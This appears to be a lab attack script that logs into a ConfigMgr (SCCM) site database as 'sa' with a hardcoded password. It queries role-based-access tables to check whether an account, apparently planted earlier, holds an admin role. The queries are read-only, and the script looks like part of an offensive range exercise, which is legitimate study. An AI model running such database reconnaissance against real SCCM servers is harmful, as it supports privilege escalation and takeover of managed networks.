# Verify MBR02\vagrant role + Run CMPivot bit — analyst_t1 (ws01 ATTACK)
import pyodbc

conn = pyodbc.connect('DRIVER={SQL Server};SERVER=mbr02.range.local,1433;DATABASE=CM_CAD;UID=sa;PWD=s@_P@ssw0rd!L@b!;Encrypt=no;TrustServerCertificate=yes;Connection Timeout=8')
print('[+] connected')

def q(title, query, limit=60):
    print('\n=== %s ===' % title)
    try:
        cur = conn.cursor(); cur.execute(query); rows = cur.fetchall()
        if not rows: print('(no rows)')
        for r in rows[:limit]: print(list(r))
    except Exception as e:
        print('ERR: %s' % e)

q('RBAC_Admins columns', "SELECT TOP 1 * FROM RBAC_Admins")
q('RBAC_Roles', "SELECT * FROM RBAC_Roles")
q('RBAC_CategoryMemberships for 16777217', "SELECT * FROM RBAC_CategoryMemberships WHERE AdminID=16777217")
q('RBAC_AdminExtendedData for 16777217', "SELECT * FROM RBAC_AdminExtendedData WHERE AdminID=16777217")
print('\nROLE_DONE')
